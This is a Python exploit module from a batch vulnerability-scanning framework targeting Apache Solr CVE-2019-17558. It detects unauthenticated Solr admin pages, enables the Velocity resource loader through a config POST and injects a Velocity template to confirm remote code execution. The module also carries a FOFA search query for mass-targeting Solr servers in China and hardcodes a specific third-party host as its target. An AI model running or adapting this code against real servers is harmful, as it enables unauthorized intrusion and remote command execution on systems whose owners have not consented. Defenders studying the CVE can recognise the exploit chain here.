# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-10 14:14

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: "app=\"solr\" && country=\"CN\""
# python batch.py -m exploit.web.Apache.Solr.template_rce -fs "app=\"APACHE-Solr\" && country=\"CN\"" -cs

class Script(BaseScript):
    name = 'Solr'

    def __init__(self, target, session):
        super().__init__()
        # basic
        self.target = target
        self.bugLevel = BugLevel.HIGH
        self.bugType = BugType.RCE
        self.bugNumber = 'CVE-2019-17558'
        # 来源
        self.refer = ''
        # session
        self.session = session
        # main
        self.detectList = ['/', '/solr']
        self.payloadList = ['/solr/admin/cores?indexInfo=false&wt=json']
        self.info = ''

    async def detect(self):
        try:
            for detectPath in self.detectList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    text = await response.text()
                    if 'Solr Admin' in text:
                        self.flag = True
                        tqdm.write(Fore.RED + '[{}] {}'.format('Solr Unauth', url))
                        return {'name': 'Solr Unauth', 'url': url, 'software': 'Solr'}
        except Exception:
            return None
        
    async def exec(self):
        try:
            for payload in self.payloadList:
                url1 = f'http://{self.target}{payload}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{payload}'
                # 获取节点名称
                async with self.session.get(url=url1, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    text = await response.json()
                    if text.get('status', ''):
                        for name in text.get('status'):
                            url2 = 'http://' + self.target + '/solr/' + name + '/config'
                            headers = {'Content-Type': 'application/json'}
                            data = '''                                    
                            {
                                "update-queryresponsewriter": {
                                    "startup": "lazy",
                                    "name": "velocity",
                                    "class": "solr.VelocityResponseWriter",
                                    "template.base.dir": "",
                                    "solr.resource.loader.enabled": "true",
                                    "params.resource.loader.enabled": "true"
                                }
                            }
                            '''
                            # 请求开启params.resource.loader.enabled
                            async with self.session.post(url=url2, timeout=self.reqTimeout, headers=headers, data=data, verify_ssl=False) as response2:
                                if response2 is not None and response2.status == 200:
                                    ran1 = random.randint(100, 999)
                                    ran2 = random.randint(100, 999)
                                    # 请求命令执行
                                    url3 = 'http://' + self.target + '/solr/' + name + '/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{ran1}%20*%20{ran2})%24c'.format(
                                        ran1=ran1, ran2=ran2)
                                    async with self.session.get(url=url3, timeout=self.reqTimeout, allow_redirects=False, verify_ssl=False) as response3:
                                        text3 = await response3.text()
                                        if str(ran1 * ran2) in text3:
                                            tqdm.write(Fore.RED + '[{}] {}'.format('Solr Template RCE', url3))
                                            return {'name': 'Solr Template RCE', 'url': url3, 'software': 'Solr'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
                if self.flag:
                    b = await self.exec()
                    if b is not None:
                        self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    semaphore = asyncio.Semaphore(500)
    pbar = tqdm(total=1, desc="solr", ncols=100)  # total是总数
    sc = Script('172-18-0-44-8080.webvpn.nbcc.cn', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore, pbar))
